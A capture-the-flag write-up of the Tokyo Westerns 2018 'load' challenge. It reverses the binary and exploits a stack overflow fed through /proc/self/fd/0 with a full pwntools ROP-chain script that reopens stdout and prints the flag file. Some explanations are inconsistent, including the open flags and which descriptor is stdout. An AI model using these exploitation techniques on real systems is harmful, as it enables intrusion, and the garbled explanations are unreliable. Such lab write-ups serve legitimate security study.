# Load Tokyo Westerns 2018

This writeup is based off of this great writeup: https://lordidiot.github.io/2018-09-03/tokyowesterns-ctf-2018-load-pwn/

So let's take a look at the file we're given:

```
$	file load 
load: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a0620e5b122fd043e5a40e181f3f3adf29e6f4c1, stripped
$	./load 
Load file Service
Input file name: load
Input offset: 2
Input size: 100
Load file complete!
Segmentation fault (core dumped)
```

So we can see that we are given a 64 bit elf. When we run it, it prompts us for an input file, an offset, and input size. It is probably reading x amount of bytes (x being the input size), starting from the offset that we gave it, from the input file we gave it.

### Reversing

`main` function:
```
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char char32[32]; // [sp+0h] [bp-30h]@1
  __int64 inp_size; // [sp+20h] [bp-10h]@1
  __int64 inp_offset; // [sp+28h] [bp-8h]@1

  setBuf();
  _printf_chk(1LL, "Load file Service\nInput file name: ");
  custom_fgets(bss_input, 128);
  _printf_chk(1LL, "Input offset: ");
  inp_offset = int_prompt();
  _printf_chk(1LL, "Input size: ");
  inp_size = int_prompt();
  read_file((__int64)char32, bss_input, inp_offset, inp_size);
  custom_close();
  return 0LL;
}
```

So here we can see the `main` function. It prints a couple of lines, prompts us for serveral different types of inputs, and runs it through the `read_file` function. The `custom_fgets` function as we can see (due to the arguments passed to it) just scans `128` bytes of input into `bss_input` (in the bss data segment at `0x601040`):

```
void __fastcall custom_fgets(char *inp_ptr, int size)
{
  char *newline; // [sp+18h] [bp-8h]@2

  if ( size >= 0 )
  {
    fgets(inp_ptr, size, stdin);
    newline = strchr(inp_ptr, '\n');
    if ( newline )
      *newline = 0;
  }
}
```

and we can see that for the inputs that are stored in `inp_offset` and `inp_size` is essentially just the output of the `atoi` function with the input being to a char pointer which had `32` bytes of input scanned in:

```
int int_prompt()
{
  char nptr; // [sp+0h] [bp-20h]@1

  nptr = 0;
  custom_fgets(&nptr, 32);
  return atoi(&nptr);
}
```

and we can see the function where the program actually reads the file:

```
int __fastcall read_file(__int64 char_ptr, const char *bss_input, __int64 inp_offset, __int64 inp_size)
{
  int result; // eax@2
  size_t nbytes; // [sp+0h] [bp-30h]@1
  __off_t offset; // [sp+8h] [bp-28h]@1
  void *buf; // [sp+18h] [bp-18h]@1
  int fd; // [sp+2Ch] [bp-4h]@1

  fd = open(bss_input, 0, inp_size, inp_offset, bss_input, char_ptr);
  if ( fd == 0xFFFFFFFF )
  {
    result = puts("You can't read this file...");
  }
  else
  {
    lseek(fd, offset, 0);
    if ( read(fd, buf, nbytes) > 0 )
      puts("Load file complete!");
    result = close(fd);
  }
  return result;
}
```

So we can see here, the function tries to open a file, with the filename being stored in `bss_input`. If it suceeds, it will then set the offset that we gave it with the `lseek` function. Proceeding that it uses the `read` function to scan in the amount of bytes that we specified as the input size into `buf`. This is a bug, since it doesn't check that it isn't scanning in more bytes than `buf` can hold which is `56` bytes (the pointer it is scanning into is `char32` which the function is called with as an argument, also it holds 48 bytes, however there is 56 bytes between the start of the space it points to and the return address). With that we have a buffer overflow. Also our code execution doesn't happen untill the main function returns, since that is the return address which we can overflow.

## Weaponization

#### Sending our own input

So we have a buffer overflow. The caveat to that, is that the input has to be from a file on a remote server which we can't write to any files. So we're going to have to jump through some hoops to get RCE, and not just a DOS.

 For what file to read from, we can read from `/proc/self/fd/0`. This file refers to `STDIN`, which allows a program to read data from the terminal. The corresponding file for `STDOUT` would be `1`. We can see here that it allows us to scan in our own input if we select that file:
 
```
 gdb-peda$ r
Starting program: /Hackery/tokyowesterns/load/load 
Load file Service
Input file name: /proc/self/fd/0
Input offset: 0
Input size: 64
0000000000000000000000000000000000000000000000000000000000000000
Load file complete!

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7ffff7b048f0 (<__close_nocancel+7>:	cmp    rax,0xfffffffffffff001)
RDX: 0x7ffff7dd3780 --> 0x0 
RSI: 0x7ffff7dd26a3 --> 0xdd3780000000000a 
RDI: 0x2 
RBP: 0x3030303030303030 ('00000000')
RSP: 0x7fffffffde88 ("00000000\001")
RIP: 0x4008a8 (ret)
R8 : 0x7ffff7fd8700 (0x00007ffff7fd8700)
R9 : 0x1999999999999999 
R10: 0x0 
R11: 0x246 
R12: 0x400720 (xor    ebp,ebp)
R13: 0x7fffffffdf60 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10217 (CARRY PARITY ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x40089d:	call   0x4008d8
   0x4008a2:	mov    eax,0x0
   0x4008a7:	leave  
=> 0x4008a8:	ret    
   0x4008a9:	push   rbp
   0x4008aa:	mov    rbp,rsp
   0x4008ad:	mov    rax,QWORD PTR [rip+0x20077c]        # 0x601030 <stdin>
   0x4008b4:	mov    esi,0x0
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffde88 ("00000000\001")
0008| 0x7fffffffde90 --> 0x1 
0016| 0x7fffffffde98 --> 0x7fffffffdf68 --> 0x7fffffffe2da ("/Hackery/tokyowesterns/load/load")
0024| 0x7fffffffdea0 --> 0x1f7ffcca0 
0032| 0x7fffffffdea8 --> 0x400816 (push   rbp)
0040| 0x7fffffffdeb0 --> 0x0 
0048| 0x7fffffffdeb8 --> 0xae821171e04ed1c7 
0056| 0x7fffffffdec0 --> 0x400720 (xor    ebp,ebp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004008a8 in ?? ()
gdb-peda$ i f
Stack level 0, frame at 0x7fffffffde88:
 rip = 0x4008a8; saved rip = 0x3030303030303030
 called by frame at 0x7fffffffde98
 Arglist at 0x7fffffffde80, args: 
 Locals at 0x7fffffffde80, Previous frame's sp is 0x7fffffffde90
 Saved registers:
  rip at 0x7fffffffde88
```

We can see that we were able to overwrite the return address (stored in the `rip` register) with the string `00000000` (which in hex is `0x3030303030303030`).

#### STDOUT/STDIN Closing

Before the function closes (and we get our rce) the function I named `custom_close` runs:

```
int custom_close()
{
  close(0);
  close(1);
  return close(2);
}
```

This function closes `STDIN`, `STDOUT`, and `STDERR` (which those things correspond to `0`, `1`, and `2`). This means that when we get our remote code execution, we can't give or send input to the program through `STDIN` or `STDOUT` without reopening those files again.

#### Flag Exfill

Now we will need to exfill the flag. We will need to reopen `STDOUT` so we can get the code to give us output. After we opened up `STDOUT` we could call `puts` (which I learned from the writuep this is based off of, that essentially just calls `write(STDOUT, "String to print\n", 16) = 16`) with the `got` address to get a libc infoleak, which we could use to call `system` however, we can just call the imported fucntions `open` and `read` to exfill the flag. 

Thing is, the file `/proc/self/fd/1` which is used by the program to access `STDOUT`, is just a symlink to `/dev/pts/2` (keep note, the person who made the writeup which this is based on, the exact file it used changed to values such as `0-3`. I found success with `2` on my local system).

So we can open that file with the open command, so it would be `open("/dev/pts/1")` twice, to open `STDOUT` followed by `open("/home/load/flag.txt")` to open the flag file (the names would be stored in the bss along with the input file and separated with a null byte, so we know the address of where they are stored in memory). File descriptors are issued by the lowest file descriptor available. Since `STDIN`, `STDOUT`, and `STDERR` have  all been closed, that means that the `0`, `1`, and `2` file decriptors are now free, and will be our next three file descriptors we issue (in an ascending order). Thing is we need `/dev/pts/2` to have the file descriptor `1` (by opening it twice), which is associated with `STDOUT`. That way when we read the contents of the flag file to it (which from there we will call the puts command, which writes to the file descriptor `0`) it will otput to the right file. Proceeding that we can just call `read(3, (bss address of "flag.txt" string), 100)` where `3` is the file descriptor for `STDOUT`.

#### ROP Chain

In order to do all of this, we will be needing to make a ROP Chain. Here is a quick high level look on what is going in in the chain / various parts of the chain.

##### Open `/proc/pts/2`

This chain will be called twice, since the first one will be assigned the file decriptor `0`, and the second will be assigned the file decriptor `1` (which we need it to be `1` in order for the puts call to work). 

Our objective is to call the equivalnet of this line of C code:

```
open("/dev/pts/2", 0x2702, 0x0)
```

Now the flag `0x2702` we are using, translates to the flags `S_ISGID` (set-group-ID bit), `S_IRWXU`, and `S_IWOTH`. These mean that the file has the Group ID bit set, the file owner has rwx permissions, and others have write permissions. The reason why we need this is because we are creating the file. The mode argument is `0x0`.

The ROP Chain we build to accomplish this is:

* Pop `0x0` into `rdx`
* Pop `0x2702` into `rsi`
* Pop `0x601050` (0x601040 + len("/proc/self/fd/0\x00")) into `rdi`
* Call open (plt address)

##### Open `/home/guy/flag.txt`

Our objective is to call the equivalnet of this line of C code:

```
open("/home/guy/flag.txt", 0x0, 0x0)
```
This chain is pretty similar to the above one. The only difference is the flag we are using is `0x0`, and the char pointer we are using is `0x60105b` (0x601040 + len("/proc/self/fd/0\x00" + "/dev/pts/2\x00"))

* Pop `0x0` into `rdx`
* Pop `0x0` into `rsi`
* Pop `0x60105b` into `rdi`
* Call open (plt address)

##### read /home/guy/flag.txt

Our objective is to call the equivalnet of this line of C code:

```
read(2, 0x601000, 10000)
```

The file descriptor `2` is that of `/home/guy/flag.txt`. The address `0x601000` is the bss segment (that we can write to), so it's just a place we can store the contents of the file at an address we know.

*	Pop `10000` into `rdx`
*	Pop `0x601000` into `rsi`
*	Pop `2` into `rdi`
*	Call read (plt address)

##### print flag

Our objective now is to call the equivalent of this line of C code:

```
puts(0x601000)
```

`0x601000` is the bss address that we just scanned in the contents of the flag into with the previous `read` call. Since puts just takes a char pointer as an argument, we should be able to just call `puts` with the argument of `0x601000` and get the flag:

* Pop `0x601000` into `rdi`
* Call puts (plt address)

##### Pop Rdx

Also since there isn't an easy gadget to pop values into the `rdx` register (like there is for `rsi` and `rdi`) we will have to use `csu_init`. Look at the exploit for more details.

## tl;dr

* Elf scans in data from file user inputs file path to, has buffer overflow
* Scan in data from /proc/self/fd/0 to input payload to elf via `STDIN`
* Use a ROP Chain to open up a new `STDOUT` (original was closed) and the flag file, scan the flag file contents into memory, then print it using `puts`

## Exploit

Here is the code for the exploit:

```
# This exploit is from: https://lordidiot.github.io/2018-09-03/tokyowesterns-ctf-2018-load-pwn/

# Import pwntools
from pwn import *

# Declare some variables needed later. The flag file on the server was /home/load/flag.txt, I just changed it to run on my local system
stdinSL = "/proc/self/fd/0"
stdout = "/dev/pts/2"
flag = "/home/guy/flag.txt"

# Declare needed plt functions
openPlt = p64(0x400710)
readPlt = p64(0x4006e8)
putsPlt = p64(0x4006c0)

# Delcare the target process
target = process('./load')
#gdb.attach(target)

# Establish the functions to pop values 
def popRdi(arg):
	return p64(0x400a73) + p64(arg)
	# 0x400a73 : pop rdi ; ret

def popRsi(arg):
	return p64(0x400a71) + p64(arg) + p64(0xdead)
	# 0x400a71 : pop rsi ; pop r15 ; ret

# This function is different from the rest, since there isn't a pop rdx gadget, we had to get creative and use csu_init
def popRdx(arg):
	segment = p64(0x400a6b)
	# 0x400a6b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
	segment += p64(1)
	segment += p64(0x600fc0) # address of GOT_close
	segment += p64(arg)
	segment += p64(0xdead)*2
	segment += p64(0x400a46)
	# 0x400a46 Not found with rop gadget, but will lead to moc rdx, r13 at 0x400a50
	segment += "0"*8*7 # For the rbx, rbp, r12, r13, r14, and r15 registers
	return segment

# Make the ROP Chain

# offset from the start of our input, to the return address
chain = "0"*56

# Rop Chain segment for open("/dev/pts/2", 0x2702, 0x0)
chain += popRdx(0)
chain += popRsi(0x2702)
chain += popRdi(0x601040 + len(stdinSL + "\x00"))
chain += openPlt

# Rop Chain segment for open("/dev/pts/2", 0x2702, 0x0)
chain += popRdx(0)
chain += popRsi(0x2702)
chain += popRdi(0x601040 + len(stdinSL + "\x00"))
chain += openPlt

# Rop Chain segment for open("/home/guy/flag.txt", 0x0, 0x0)
chain += popRdx(0)
chain += popRsi(0x0)
chain += popRdi(0x601040 + len(stdinSL + "\x00" + stdout + "\x00"))
chain += openPlt

# Rop Chain segment for read(2, 0x601000, 10000)
chain += popRdx(10000)
chain += popRsi(0x601000)
chain += popRdi(2)
chain += readPlt

# Rop Chain for puts(0x601000)
chain += popRdi(0x601000)
chain += putsPlt

# Send the string we want for the input filename
target.sendline(stdinSL + "\x00" + stdout + "\x00" + flag + "\x00")

# Send our offset, 0
target.sendline("0")

# Send our input size, the size of our ROP Chain
target.sendline(str(len(chain)))

# Send our ROP Chain
target.sendline(chain)

# Drop to an interactive shell and see the flag, if we did everything right
print target.interactive()
```

and when we run it:

```
$	python exploit.py
[+] Starting local process './load': pid 29020
flag{g0ttem_b0yz}

[*] Switching to interactive mode
Load file Service
Input file name: Input offset: Input size: Load file complete!
[*] Got EOF while reading in interactive
$ 
[*] Interrupted
None
[*] Process './load' stopped with exit code -11 (SIGSEGV) (pid 29020)
```

Just like that, we got the flag!

Once again this writeup is based off of this great writeup: https://lordidiot.github.io/2018-09-03/tokyowesterns-ctf-2018-load-pwn/